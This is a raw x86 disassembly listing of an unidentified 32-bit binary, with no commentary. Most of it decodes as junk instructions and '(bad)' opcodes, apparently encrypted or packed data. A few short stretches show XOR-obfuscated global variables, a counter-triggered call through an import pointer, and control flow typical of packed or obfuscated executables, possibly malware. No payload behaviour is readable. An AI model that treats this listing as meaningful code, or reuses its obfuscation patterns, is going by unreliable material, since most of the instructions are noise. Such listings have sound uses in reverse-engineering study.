  40f842:	sub    al,0x3d
  40f844:	ret    
  40f845:	test   al,0x81
  40f847:	sahf   
  40f848:	in     eax,0xc
  40f84a:	pop    es
  40f84b:	daa    
  40f84c:	xchg   ecx,eax
  40f84d:	sbb    edx,ebp
  40f84f:	xor    ecx,esi
  40f851:	adc    al,0x9f
  40f853:	aaa    
  40f854:	in     al,dx
  40f855:	idiv   dl
  40f857:	aaa    
  40f858:	repnz stc 
  40f85a:	fwait
  40f85b:	int    0xad
  40f85d:	mov    BYTE PTR [eax+0x26],dl
  40f860:	sbb    al,0x28
  40f862:	add    al,BYTE PTR [ebp+0x63bc51c4]
  40f868:	or     dh,dh
  40f86a:	ret    
  40f86b:	pop    ds
  40f86c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f86d:	add    al,0x73
  40f86f:	pop    edx
  40f870:	jmp    0x382f:0x565115c0
  40f877:	push   cs
  40f878:	mov    DWORD PTR [esi],0x40133cd5
  40f87e:	inc    esi
  40f87f:	leave  
  40f880:	and    DWORD PTR [edi+0x6ef54ffd],ebx
  40f886:	(bad)  
  40f887:	sub    BYTE PTR [esi+0x53021d23],bl
  40f88d:	rcl    DWORD PTR [esp+eax*2+0x6c2c72d2],cl
  40f894:	mov    ecx,0x984ea4d7
  40f899:	addr16 dec esp
  40f89b:	and    DWORD PTR [esi],esi
  40f89d:	adc    edi,DWORD PTR [esi-0x27]
  40f8a0:	adc    ch,ah
  40f8a2:	ds sub eax,0x93dc9cc6
  40f8a8:	mov    al,0x4d
  40f8aa:	mov    al,ds:0xba4e08be
  40f8af:	leave  
  40f8b0:	mov    dh,0xda
  40f8b2:	mov    bl,0x9c
  40f8b4:	icebp  
  40f8b5:	test   al,0x91
  40f8b7:	mov    edx,0xb5d18045
  40f8bc:	hlt    
  40f8bd:	rcl    BYTE PTR [ecx+0x4b],1
  40f8c0:	ror    edi,1
  40f8c2:	pusha  
  40f8c3:	fstp   TBYTE PTR [ebp+0x691a5142]
  40f8c9:	or     eax,0xe0c9b708
  40f8ce:	jne    0x40f883
  40f8d0:	push   esp
  40f8d1:	sub    cl,BYTE PTR [esi-0x30ab943]
  40f8d7:	dec    esp
  40f8d8:	sub    eax,0x7948f663
  40f8dd:	push   es
  40f8de:	call   0xfc45:0x8b9627f0
  40f8e5:	mov    ecx,DWORD PTR [ebp+0xc]
  40f8e8:	xor    DWORD PTR ds:0x4345bf,0x43464f
  40f8f2:	xor    eax,edi
  40f8f4:	add    eax,esi
  40f8f6:	mov    DWORD PTR ds:0x43460b,0x4bab
  40f900:	cmp    eax,ecx
  40f902:	mov    DWORD PTR ds:0x43468f,0x3e53
  40f90c:	je     0x40fd56
  40f912:	and    DWORD PTR ds:0x434613,edi
  40f918:	mov    eax,DWORD PTR [ebp-0x4]
  40f91b:	mov    edx,DWORD PTR ds:0x43456b
  40f921:	xor    DWORD PTR ds:0x4345d3,edx
  40f927:	xor    eax,edi
  40f929:	and    DWORD PTR ds:0x43463f,0x0
  40f933:	mov    edx,DWORD PTR ds:0x43463f
  40f939:	inc    edx
  40f93a:	mov    DWORD PTR ds:0x43463f,edx
  40f940:	cmp    DWORD PTR ds:0x43463f,0x9
  40f947:	jne    0x40f96a
  40f94d:	push   0x4345cb
  40f952:	push   0x434712
  40f957:	push   0x7b5f
  40f95c:	push   0x5aad
  40f961:	push   DWORD PTR [ebp-0xc]
  40f964:	call   DWORD PTR ds:0x4132a4
  40f96a:	cmp    DWORD PTR ds:0x43463f,0x8
  40f971:	jne    0x40f986
  40f977:	xor    edx,edx
  40f979:	xor    edx,DWORD PTR ds:0x43463f
  40f97f:	inc    edx
  40f980:	mov    DWORD PTR ds:0x43463f,edx
  40f986:	cmp    DWORD PTR ds:0x43463f,0x10
  40f98d:	jb     0x40f933
  40f993:	and    DWORD PTR ds:0x43463f,edx
  40f999:	add    eax,esi
  40f99b:	push   eax
  40f99c:	push   DWORD PTR [ebp-0x8]
  40f99f:	push   DWORD PTR [ebp-0x4]
  40f9a2:	mov    edx,DWORD PTR ds:0x414afe
  40f9a8:	jmp    0x40fd3b
  40f9ad:	pop    ebx
  40f9ae:	pop    edi
  40f9af:	cld    
  40f9b0:	sub    edi,esp
  40f9b2:	mov    ebp,0x81a66f6d
  40f9b7:	push   esi
  40f9b8:	in     eax,dx
  40f9b9:	jae    0x40f963
  40f9bb:	sbb    ebp,DWORD PTR [esi+0x7e7ebd14]
  40f9c1:	hlt    
  40f9c2:	jns    0x40fa42
  40f9c4:	jle    0x40f967
  40f9c6:	mov    ah,0x8f
  40f9c8:	push   es
  40f9c9:	(bad)  
  40f9ca:	mov    bh,0x28
  40f9cc:	xchg   esp,eax
  40f9cd:	sbb    bh,cl
  40f9cf:	add    DWORD PTR [edx],esp
  40f9d1:	mov    ebx,0x941b5d2c
  40f9d6:	enter  0xaea8,0x28
  40f9da:	call   FWORD PTR [ebp+eiz*2+0x3bf7a7cd]
  40f9e1:	jnp    0x40fa4f
  40f9e3:	push   ss
  40f9e4:	(bad)  
  40f9e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9e6:	out    dx,al
  40f9e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9e8:	pushf  
  40f9e9:	mov    ecx,0xdba17caf
  40f9ee:	mov    edi,0x37b3cab3
  40f9f3:	outs   dx,BYTE PTR ds:[esi]
  40f9f4:	add    al,0x8c
  40f9f6:	cmp    ebp,esi
  40f9f8:	jle    0x40fa68
  40f9fa:	mov    dh,0xa2
  40f9fc:	cld    
  40f9fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9fe:	sub    al,0x64
  40fa00:	xchg   esp,eax
  40fa01:	lods   eax,DWORD PTR ds:[esi]
  40fa02:	pop    edi
  40fa03:	inc    edi
  40fa04:	jb     0x40fa16
  40fa06:	lahf   
  40fa07:	mov    ds:0x268e7a6c,eax
  40fa0c:	pop    ebx
  40fa0d:	dec    ecx
  40fa0e:	(bad)  
  40fa0f:	fadd   st(5),st
  40fa11:	gs dec ebx
  40fa13:	data16 xchg cl,dl
  40fa16:	out    0x5f,eax
  40fa18:	pop    ebx
  40fa19:	fist   WORD PTR [esp+esi*4+0x748b89dd]
  40fa20:	xchg   esp,eax
  40fa21:	push   esi
  40fa22:	test   al,0xae
  40fa24:	fisttp WORD PTR [eax+ebx*8+0x33]
  40fa28:	das    
  40fa29:	nop
  40fa2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa2b:	mov    ebp,0xbacc313f
  40fa30:	inc    edx
  40fa31:	sti    
  40fa32:	jl     0x40f9ca
  40fa34:	xor    eax,0xc19fa431
  40fa39:	mov    bh,0xd7
  40fa3b:	mov    al,ds:0xd66a2ed9
  40fa40:	int3   
  40fa41:	das    
  40fa42:	int    0xfc
  40fa44:	mov    ch,0x2a
  40fa46:	daa    
  40fa47:	add    esi,esi
  40fa49:	xchg   edx,eax
  40fa4a:	out    0xae,al
  40fa4c:	xchg   DWORD PTR [edi],edx
  40fa4e:	ja     0x40f9ef
  40fa50:	stos   BYTE PTR es:[edi],al
  40fa51:	inc    eax
  40fa52:	retf   
  40fa53:	fcom   DWORD PTR [esi]
  40fa55:	je     0x40fa9a
  40fa57:	jns    0x40fa89
  40fa59:	or     esi,ebx
  40fa5b:	mov    ah,0x53
  40fa5d:	xor    ah,cl
  40fa5f:	ss pusha 
  40fa61:	jmp    0x302bd9ee
  40fa66:	ins    DWORD PTR es:[edi],dx
  40fa67:	(bad)  
  40fa68:	fsubr  QWORD PTR [edi]
  40fa6a:	xlat   BYTE PTR ds:[ebx]
  40fa6b:	dec    ebp
  40fa6c:	popf   
  40fa6d:	mov    gs,WORD PTR [esi]
  40fa6f:	jbe    0x40fab7
  40fa71:	pop    esi
  40fa72:	push   0x521e8733
  40fa77:	pop    ebx
  40fa78:	xchg   ebx,eax
  40fa79:	add    esi,ebx
  40fa7b:	push   edx
  40fa7c:	int3   
  40fa7d:	repz in eax,0xb1
  40fa80:	adc    BYTE PTR [esi-0x7c],0xef
  40fa84:	pop    ss
  40fa85:	mov    esp,0x477fcb8
  40fa8a:	imul   ebx,DWORD PTR [ebp+0x64],0x28dc4bb8
  40fa91:	cwde   
  40fa92:	inc    edi
  40fa93:	scas   eax,DWORD PTR es:[edi]
  40fa94:	and    DWORD PTR [ebx+0x7e],edi
  40fa97:	outs   dx,DWORD PTR ds:[esi]
  40fa98:	outs   dx,DWORD PTR ds:[esi]
  40fa99:	and    ah,BYTE PTR [eax-0x4df89bd0]
  40fa9f:	stos   DWORD PTR es:[edi],eax
  40faa0:	sbb    eax,0xd9413214
  40faa5:	pop    ebp
  40faa6:	fild   WORD PTR [edx+0x20781de]
  40faac:	sub    eax,0x748f38d6
  40fab1:	push   0xccb004ab
  40fab6:	test   BYTE PTR [ebp+0x7492d942],0x3
  40fabd:	jbe    0x40faa2
  40fabf:	pop    ds
  40fac0:	fisttp WORD PTR fs:[eax-0x47]
  40fac4:	pop    ds
  40fac5:	pop    ds
  40fac6:	xor    eax,0xa27ae637
  40facb:	sbb    dh,bl
  40facd:	jae    0x40facc
  40facf:	mov    ah,0x0
  40fad1:	xor    cl,bl
  40fad3:	(bad)  
  40fad4:	aad    0xf1
  40fad6:	jg     0x40fa73
  40fad8:	sub    eax,0x2d55d4fd
  40fadd:	outs   dx,BYTE PTR ds:[esi]
  40fade:	fimul  WORD PTR [ebx+ecx*8]
  40fae1:	mov    BYTE PTR [eax-0x3d],al
  40fae4:	or     DWORD PTR [ebx+0x69],ecx
  40fae7:	lds    edx,FWORD PTR [esi+0x9]
  40faea:	mov    bh,0xaa
  40faec:	inc    eax
  40faed:	mov    ds:0xd17569a5,al
  40faf2:	adc    BYTE PTR [edx+0x6cb60795],ah
  40faf8:	sub    ecx,DWORD PTR [ebp+0x60]
  40fafb:	fstp   QWORD PTR [esi+0x6c028df2]
  40fb01:	cs dec edi
  40fb03:	inc    eax
  40fb04:	mov    esp,0x7aa25481
  40fb09:	out    0xa7,eax
  40fb0b:	cmp    eax,0xd86cae01
  40fb10:	xor    BYTE PTR [esi-0x20c6ca3b],dl
  40fb16:	jbe    0x40fb70
  40fb18:	xor    DWORD PTR [ecx],esi
  40fb1a:	xor    bh,BYTE PTR [ecx+esi*2]
  40fb1d:	outs   dx,BYTE PTR ds:[esi]
  40fb1e:	jg     0x40fb5d
  40fb20:	out    dx,eax
  40fb21:	in     al,dx
  40fb22:	(bad)  
  40fb23:	dec    eax
  40fb24:	lea    eax,[edi]
  40fb26:	sub    ebx,edx
  40fb28:	push   edx
  40fb29:	les    ecx,FWORD PTR [ecx-0x42875701]
  40fb2f:	sbb    al,0x33
  40fb31:	cmp    eax,0xfe5e2621
  40fb36:	cld    
  40fb37:	mov    edx,0x981269aa
  40fb3c:	adc    al,0xf9
  40fb3e:	retf   
  40fb3f:	pop    esp
  40fb40:	push   ds
  40fb41:	sbb    ebx,DWORD PTR [edx]
  40fb43:	ins    BYTE PTR es:[edi],dx
  40fb44:	sbb    eax,0x6080ecea
  40fb49:	stc    
  40fb4a:	ins    DWORD PTR es:[edi],dx
  40fb4b:	retf   0x54af
  40fb4e:	mov    ebx,0xf28252cf
  40fb53:	or     BYTE PTR [ebx+0x148f976b],al
  40fb59:	imul   esp,DWORD PTR [esi+0x7a],0xffffffad
  40fb5d:	dec    sp
  40fb5f:	mov    ds:0x1a232e93,al
  40fb64:	fistp  DWORD PTR [esi]
  40fb66:	mov    ebp,DWORD PTR [ebx+0x6a3b318c]
  40fb6c:	fimul  WORD PTR [edx+0x32]
  40fb6f:	or     eax,0xff00a8cf
  40fb74:	push   esi
  40fb75:	scas   eax,DWORD PTR es:[edi]
  40fb76:	imul   esi,DWORD PTR [ecx],0x2dd07fdf
  40fb7c:	rcr    DWORD PTR [eax-0x21],1
  40fb7f:	mov    bh,0x14
  40fb81:	fyl2xp1 
  40fb83:	jb     0x40fb08
  40fb85:	inc    eax
  40fb86:	repnz mov ah,0x5b
  40fb89:	jp     0x40fb3f
  40fb8b:	inc    edi
  40fb8c:	loop   0x40fb18
  40fb8e:	jmp    0x81c904a1
  40fb93:	ret    0x29e8
  40fb96:	fcmovne st,st(2)
  40fb98:	sub    eax,0x7925cd48
  40fb9d:	ss js  0x40fbde
  40fba0:	ror    BYTE PTR [eax],0x2
  40fba3:	jbe    0x40fc04
  40fba5:	mov    eax,ds:0x3896cf1a
  40fbaa:	mov    ecx,0xb1d17a4d
  40fbaf:	xor    BYTE PTR [ecx],ch
  40fbb1:	jp     0x40fc1d
  40fbb3:	cmp    esp,esp
  40fbb5:	push   ebp
  40fbb6:	jl     0x40fbfb
  40fbb8:	mov    ecx,0xc30fa79e
  40fbbd:	mov    cl,0x35
  40fbbf:	sti    
  40fbc0:	gs jecxz 0x40fb89
  40fbc3:	sub    BYTE PTR [ecx+0x322b797a],cl
  40fbc9:	es loop 0x40fba8
  40fbcc:	outs   dx,BYTE PTR ds:[esi]
  40fbcd:	(bad)
  40fbd1:	(bad)  
  40fbd2:	mov    ds:0xa3e794b,al
  40fbd7:	out    0x42,al
  40fbd9:	lods   al,BYTE PTR ds:[esi]
  40fbda:	sbb    BYTE PTR [eax+0x6b],0xfd
  40fbde:	out    dx,al
  40fbdf:	stc    
  40fbe0:	mov    ebx,0x406e75eb
  40fbe5:	pop    ds
  40fbe6:	mov    eax,ds:0xcbd040d9
  40fbeb:	xor    BYTE PTR [eax],ah
  40fbed:	cmp    bl,bh
  40fbef:	icebp  
  40fbf0:	jbe    0x40fba7
  40fbf2:	pop    ecx
  40fbf3:	(bad)  
  40fbf4:	jbe    0x40fbc5
  40fbf6:	sbb    al,0x69
  40fbf8:	pop    ebp
  40fbf9:	pop    es
  40fbfa:	out    dx,al
  40fbfb:	mov    esp,0x327ce6a
  40fc00:	push   0xf216378f
  40fc05:	jge    0x40fc74
  40fc07:	pop    edi
  40fc08:	mov    ds:0x9b0ebdf0,al
  40fc0d:	call   0x8911d3b5
  40fc12:	jno    0x40fc13
  40fc14:	(bad)  
  40fc15:	shl    ecx,1
  40fc17:	push   ds
  40fc18:	pop    esi
  40fc19:	aas    
  40fc1a:	call   eax
  40fc1c:	jle    0x40fc2a
  40fc1e:	pop    eax
  40fc1f:	jb     0x40fc02
  40fc21:	xchg   esi,eax
  40fc22:	inc    edx
  40fc23:	inc    edx
  40fc24:	mov    ah,0xff
  40fc26:	repnz or BYTE PTR [edi+ecx*4-0x6861af03],dl
  40fc2e:	imul   ebp,DWORD PTR [eax-0x58],0x6333b8d3
  40fc35:	call   0x38d4:0x77f496f9
  40fc3c:	lods   al,BYTE PTR ds:[esi]
  40fc3d:	mov    WORD PTR [ebx-0x2a],es
  40fc40:	aaa    
  40fc41:	sbb    BYTE PTR [edi],dl
  40fc43:	dec    edi
  40fc44:	gs pop ss
  40fc46:	sub    DWORD PTR [eax+0x74],esp
  40fc49:	leave  
  40fc4a:	xchg   ecx,eax
  40fc4b:	mov    esp,0xe84a7043
  40fc50:	or     bh,BYTE PTR [eax+0x1]
  40fc53:	out    0x99,eax
  40fc55:	jb     0x40fc06
  40fc57:	cmp    eax,DWORD PTR [edi+0x69]
  40fc5a:	jnp    0x40fbe9
  40fc5c:	js     0x40fc53
  40fc5e:	lahf   
  40fc5f:	stos   BYTE PTR es:[edi],al
  40fc60:	dec    esi
  40fc61:	(bad)  
  40fc62:	bnd jmp 0x40fc36
  40fc65:	sbb    esi,DWORD PTR [ebp+0x73f48777]
  40fc6b:	mov    ch,0xd
  40fc6d:	adc    eax,0x357f1572
  40fc72:	xchg   DWORD PTR [edi-0x2eae94d5],edi
  40fc78:	push   ss
  40fc79:	cdq    
  40fc7a:	push   eax
  40fc7b:	jne    0x40fcd7
  40fc7d:	ss sbb eax,0xb8f543da
  40fc83:	dec    esi
  40fc84:	popa   
  40fc85:	je     0x40fcc4
  40fc87:	sbb    DWORD PTR [edi+0x59],ebx
  40fc8a:	mov    ebx,0xcb3ad497
  40fc8f:	mov    al,ds:0x5b637ef
  40fc94:	cwde   
  40fc95:	(bad)  
  40fc96:	in     al,0x12
  40fc98:	xor    ah,BYTE PTR [eax]
  40fc9a:	push   es
  40fc9b:	jp     0x40fcc7
  40fc9d:	pop    ebx
  40fc9e:	mov    ebp,0x7584d36
  40fca3:	(bad)  
  40fca4:	sbb    al,0xab
  40fca6:	outs   dx,BYTE PTR ds:[esi]
  40fca7:	dec    ebp
  40fca8:	cmp    esi,ebx
  40fcaa:	iret   
  40fcab:	int3   
  40fcac:	and    cl,BYTE PTR [esi]
  40fcae:	jl     0x40fc3a
  40fcb0:	or     DWORD PTR [esi+0x20],ecx
  40fcb3:	sar    DWORD PTR [edi-0x142bb825],1
  40fcb9:	mov    ah,0x94
  40fcbb:	mov    ah,0xa7
  40fcbd:	int    0x65
  40fcbf:	addr16 imul eax
  40fcc2:	pop    edi
  40fcc3:	push   cs
  40fcc4:	mov    ebp,0xe51aeefe
  40fcc9:	imul   ecx,DWORD PTR [edx-0x69],0x21
  40fccd:	(bad)  
  40fcce:	mov    ch,0xd5
  40fcd0:	dec    esi
  40fcd1:	aad    0xcb
  40fcd3:	jo     0x40fcdb
  40fcd5:	arpl   WORD PTR [esi-0x1a],sp
  40fcd8:	int    0xfd
  40fcda:	xchg   esi,eax
  40fcdb:	sbb    bh,BYTE PTR [esp+ebx*1]
  40fcde:	cmp    eax,0x2aa2cf15
  40fce3:	mov    bl,0xe
  40fce5:	and    BYTE PTR [eax+0x53],ah
  40fce8:	pop    esi
  40fce9:	jno    0x40fc9d
  40fceb:	ins    DWORD PTR es:[edi],dx
  40fcec:	jbe    0x40fc80
  40fcee:	sbb    eax,0xba8d5009
  40fcf3:	cmp    DWORD PTR [ebx-0x27],edx
  40fcf6:	jnp    0x40fd66
  40fcf8:	push   ds
  40fcf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcfa:	push   0xffffffcc
  40fcfc:	mov    ch,cl
  40fcfe:	popf   
  40fcff:	rcl    DWORD PTR [edx],1
  40fd01:	repz xor ah,cl
  40fd04:	repz xor eax,0xcf7c5904
  40fd0a:	imul   edx,DWORD PTR [edi-0x59e4bf3b],0x5e
  40fd11:	fs jl  0x40fd92
  40fd14:	stc    
  40fd15:	mov    ds:0x188be0ec,al
  40fd1a:	cld    
  40fd1b:	shl    BYTE PTR [ecx-0x533d34fa],1
  40fd21:	inc    ebx
  40fd22:	dec    ecx
  40fd23:	popf   
  40fd24:	and    BYTE PTR [edx],ch
  40fd26:	aad    0x3e
  40fd28:	loop   0x40fcf9
  40fd2a:	cmp    ebx,ebp
  40fd2c:	pushf  
  40fd2d:	jmp    0x40fcb1
  40fd2f:	stos   DWORD PTR es:[edi],eax
  40fd30:	cwde   
  40fd31:	dec    edx
  40fd32:	push   0xffffffee
  40fd34:	pop    edi
  40fd35:	mov    ss,esp
  40fd37:	ss out dx,al
  40fd39:	xchg   ecx,eax
  40fd3a:	into   
  40fd3b:	call   0x41098a
  40fd40:	mov    ecx,DWORD PTR ds:0x414afe
  40fd46:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40fd4c:	mov    DWORD PTR [ecx],eax
  40fd4e:	mov    eax,DWORD PTR [ebp-0x8]
  40fd51:	jmp    0x410121
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp+0x10]
  40fd5c:	xor    eax,edi
  40fd5e:	add    eax,esi
  40fd60:	cmp    eax,ecx
  40fd62:	jne    0x41011e
  40fd68:	mov    eax,DWORD PTR [ebp-0x4]
  40fd6b:	xor    eax,edi
  40fd6d:	add    eax,esi
  40fd6f:	mov    ds:0x414b82,eax
  40fd74:	mov    eax,DWORD PTR [ebp-0x4]
  40fd77:	xor    eax,edi
  40fd79:	add    eax,esi
  40fd7b:	mov    ds:0x414b7a,eax
  40fd80:	push   DWORD PTR [ebp-0x8]
  40fd83:	push   DWORD PTR [ebp-0x4]
  40fd86:	call   0x408384
  40fd8b:	jmp    0x41011e
  40fd90:	in     eax,0x27
  40fd92:	ss xor bh,ah
  40fd95:	xor    esp,ebp
  40fd97:	icebp  
  40fd98:	add    DWORD PTR [eax+esi*4+0x77],edi
  40fd9c:	sbb    ebp,DWORD PTR [bx+si]
  40fd9f:	je     0x40fd23
  40fda1:	mov    eax,0x79f47e7e
  40fda6:	jle    0x40fe26
  40fda8:	push   ebp
  40fda9:	add    BYTE PTR [ebp-0x5c],ch
  40fdac:	pop    ebx
  40fdad:	retf   
  40fdae:	jmp    0x8e02eb44
  40fdb3:	jne    0x40fd61
  40fdb5:	lds    esp,FWORD PTR [ecx+0x52]
  40fdb8:	mov    ah,0x53
  40fdba:	pop    es
  40fdbb:	adc    esi,eax
  40fdbd:	repnz stos DWORD PTR es:[edi],eax
  40fdbf:	icebp  
  40fdc0:	jecxz  0x40fde3
  40fdc2:	pop    es
  40fdc3:	mov    ebx,0x3a538bc2
  40fdc8:	jle    0x40fe15
  40fdca:	iret   
  40fdcb:	jb     0x40fde2
  40fdcd:	fstp   DWORD PTR [edx]
  40fdcf:	xchg   DWORD PTR [edi-0x2c2e033],eax
  40fdd5:	mov    fs,WORD PTR [edi+0x7126539d]
  40fddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fddc:	push   ebp
  40fddd:	adc    eax,0x2601929c
  40fde2:	stos   BYTE PTR es:[edi],al
  40fde3:	scas   eax,DWORD PTR es:[edi]
  40fde4:	pop    ebx
  40fde5:	call   FWORD PTR [eax-0x11c827ac]
  40fdeb:	pop    ds
  40fdec:	jmp    FWORD PTR [ebp-0x6b0d78bd]
  40fdf2:	rcr    BYTE PTR [edx+0xe],0x5c
  40fdf6:	cli    
  40fdf7:	adc    ah,BYTE PTR [edx+0x47]
  40fdfa:	test   eax,0xb7c97553
  40fdff:	adc    ah,BYTE PTR [ebx+0x6db34c26]
  40fe05:	or     bh,BYTE PTR [ebx+0x8]
  40fe08:	repz shl BYTE PTR [esi],1
  40fe0b:	into   
  40fe0c:	fcom   QWORD PTR ds:0x952f905d
  40fe12:	xchg   ebp,eax
  40fe13:	jg     0x40fd99
  40fe15:	loope  0x40fdc1
  40fe17:	dec    edx
  40fe18:	rcr    BYTE PTR [ebp-0x22e3ea63],1
  40fe1e:	pop    ss
  40fe1f:	cdq    
  40fe20:	in     al,dx
  40fe21:	xor    eax,0xaa7c0f3a
  40fe26:	pop    ss
  40fe27:	and    DWORD PTR [ecx+0xf],eax
  40fe2a:	dec    edi
  40fe2b:	sbb    BYTE PTR [ebx+0x47],ah
  40fe2e:	ret    
  40fe2f:	mov    dh,0x5c
  40fe31:	and    al,0xe
  40fe33:	aad    0x34
  40fe35:	mov    ebx,0x2249ebdc
  40fe3a:	dec    ebx
  40fe3b:	fidiv  DWORD PTR [eax]
  40fe3d:	popf   
  40fe3e:	rol    BYTE PTR [ebx+0x42928dd4],1
  40fe44:	xor    eax,0x65f6abf
  40fe49:	pusha  
  40fe4a:	inc    edx
  40fe4b:	push   esp
  40fe4c:	out    0x34,eax
  40fe4e:	fdivr  QWORD PTR [ecx]
  40fe50:	test   DWORD PTR [ebx-0x75],0xd707a65e
  40fe57:	pusha  
  40fe58:	mov    dl,0x62
  40fe5a:	fnstsw WORD PTR [esi+0x34]
  40fe5d:	test   al,0x57
  40fe5f:	adc    al,0x3d
  40fe61:	add    ebp,ebp
  40fe63:	loopne 0x40fe81
  40fe65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe66:	mov    WORD PTR [edx+0x374a20d5],cs
  40fe6c:	jae    0x40fe79
  40fe6e:	sbb    eax,0xc2d251e6
  40fe73:	add    DWORD PTR [edx],edx
  40fe75:	and    cl,BYTE PTR [edx+eax*8]
  40fe78:	sub    al,0xba
  40fe7a:	jp     0x40fe6a
  40fe7c:	add    DWORD PTR [ebx-0x5ed2d03e],esi
  40fe82:	shl    BYTE PTR [edi+0x77ed78a4],0x77
  40fe89:	jno    0x40feb2
  40fe8b:	push   es
  40fe8c:	inc    edi
  40fe8d:	lods   al,BYTE PTR ds:[esi]
  40fe8e:	outs   dx,BYTE PTR ds:[esi]
  40fe8f:	(bad)  
  40fe90:	mov    eax,0xc9e14619
  40fe95:	jne    0x40fe17
  40fe97:	outs   dx,BYTE PTR ds:[esi]
  40fe98:	out    0x6b,al
  40fe9a:	mov    edx,esi
  40fe9c:	and    BYTE PTR [eax-0x1d],ch
  40fe9f:	dec    edi
  40fea0:	mov    bh,0xbe
  40fea2:	inc    edx
  40fea3:	stc    
  40fea4:	jnp    0x40ff19
  40fea6:	pop    eax
  40fea7:	mov    DWORD PTR [ebp+ebx*1-0x66],0x21e71825
  40feaf:	dec    edx
  40feb0:	add    dh,dh
  40feb2:	mul    DWORD PTR [edi+0x5b522093]
  40feb8:	jle    0x40fe7a
  40feba:	cmp    eax,0x95983ef7
  40febf:	push   esp
  40fec0:	out    dx,al
  40fec1:	es in  al,0x25
  40fec4:	add    esi,ebp
  40fec6:	arpl   WORD PTR [esi-0x73],bx
  40fec9:	or     al,0xaa
  40fecb:	dec    edi
  40fecc:	or     BYTE PTR [eax-0xf],dh
  40fecf:	and    DWORD PTR [esi-0x79],edi
  40fed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fed3:	push   ebx
  40fed4:	mov    edi,0xa4ecc374
  40fed9:	into   
  40feda:	sub    dl,dh
  40fedc:	test   eax,0x31d27593
  40fee1:	cld    
  40fee2:	adc    esp,DWORD PTR [edx-0x60]
  40fee5:	or     al,0x60
  40fee7:	push   ebx
  40fee8:	mov    esp,0xbed17498
  40feed:	enter  0x45ec,0xfa
  40fef1:	adc    ah,BYTE PTR ds:0xde26bfd
  40fef7:	call   0x7a71acb5
  40fefc:	mov    edi,0x35df65d
  40ff01:	xor    al,0x3b
  40ff03:	mov    eax,ds:0x89f796d4
  40ff08:	in     eax,0x85
  40ff0a:	push   eax
  40ff0b:	jno    0x40fec2
  40ff0d:	sbb    cl,cl
  40ff0f:	inc    edx
  40ff10:	and    al,0x11
  40ff12:	aad    0x34
  40ff14:	mov    ds:0x49167893,eax
  40ff19:	mov    edx,0x44ab013b
  40ff1e:	retf   0x100c
  40ff21:	sbb    al,0x36
  40ff23:	jecxz  0x40ff04
  40ff25:	pop    eax
  40ff26:	das    
  40ff27:	sbb    ch,BYTE PTR [edi-0x7dc29a27]
  40ff2d:	pop    esi
  40ff2e:	mov    dl,0xbe
  40ff30:	mov    ss,edi
  40ff32:	push   0x63ebd689
  40ff37:	dec    esp
  40ff38:	ror    ch,1
  40ff3a:	retf   0xd157
  40ff3d:	pop    esp
  40ff3e:	and    DWORD PTR [edx-0x54],ebx
  40ff41:	mov    cl,0xc7
  40ff43:	cmp    esi,DWORD PTR [ebx]
  40ff45:	mov    BYTE PTR [esp+ecx*8],bh
  40ff48:	call   0x9478:0xae48b49f
  40ff4f:	pop    ecx
  40ff51:	int    0x93
  40ff53:	adc    ch,al
  40ff55:	dec    eax
  40ff56:	sub    edi,DWORD PTR [esi+0x6c]
  40ff59:	or     dh,0x9a
  40ff5c:	push   ebp
  40ff5d:	rcl    DWORD PTR [edi+0x46],cl
  40ff60:	daa    
  40ff61:	jns    0x40ffbf
  40ff63:	cmp    al,BYTE PTR [eax-0x3f]
  40ff66:	lock sbb BYTE PTR [esi-0x2e],dl
  40ff6a:	sti    
  40ff6b:	mov    al,0xb
  40ff6d:	loope  0x40ff63
  40ff6f:	cs fdivr st(3),st
  40ff72:	jb     0x40ff0e
  40ff74:	jmp    0xfaa574dc
  40ff79:	sub    ah,BYTE PTR [edi]
  40ff7b:	push   eax
  40ff7c:	(bad)  
  40ff7d:	xchg   esp,eax
  40ff7e:	xchg   DWORD PTR [esi-0x49],edi
  40ff81:	cmp    dh,dl
  40ff83:	dec    esi
  40ff84:	scas   eax,DWORD PTR es:[edi]
  40ff85:	loope  0x40ffe9
  40ff87:	inc    ebx
  40ff88:	mov    ebx,0xa421a4ff
  40ff8d:	(bad)  
  40ff8e:	and    eax,0xed9a4ee9
  40ff93:	sub    eax,0xf0de73ea
  40ff98:	inc    ebp
  40ff99:	test   eax,0x684c8ebd
  40ff9e:	std    
  40ff9f:	xchg   esp,eax
  40ffa0:	fs push cs
  40ffa2:	inc    esp
  40ffa3:	and    DWORD PTR [edx],ebx
  40ffa5:	hlt    
  40ffa6:	fbld   TBYTE PTR [eax]
  40ffa8:	out    0x42,al
  40ffaa:	cs pop eax
  40ffac:	int    0xb9
  40ffae:	cmc    
  40ffaf:	xor    esp,DWORD PTR [ecx]
  40ffb1:	cmp    ah,BYTE PTR [edx+edx*1+0x7b]
  40ffb5:	fist   WORD PTR [esi+eiz*8-0x1f9e968]
  40ffbc:	xchg   cl,dh
  40ffbe:	push   edi
  40ffbf:	mov    BYTE PTR [ebp-0x76],dl
  40ffc2:	sbb    esi,DWORD PTR [ebp+0x51]
  40ffc5:	cmp    BYTE PTR [ecx+0x3b17c039],ch
  40ffcb:	mov    ds:0x76ca682a,al
  40ffd0:	enterw 0xf722,0x49
  40ffd5:	and    eax,0xe05c7fc
  40ffda:	and    ebp,DWORD PTR [edi-0x14870e22]
  40ffe0:	sti    
  40ffe1:	(bad)  
  40ffe2:	shr    DWORD PTR [esi],1
  40ffe4:	inc    ecx
  40ffe5:	add    DWORD PTR [edi+0x7b42aeba],0x74e961b0
  40ffef:	mov    ebp,0x9aad0439
  40fff4:	test   BYTE PTR [eax+0x60],bh
  40fff7:	frstor [ebx]
  40fff9:	push   eax
  40fffa:	push   ss
  40fffb:	sbb    ax,0x4527
  40ffff:	push   edi
  410000:	sbb    DWORD PTR [edi+eiz*1+0x7e46a582],0x45771b6d
  41000b:	add    eax,eax
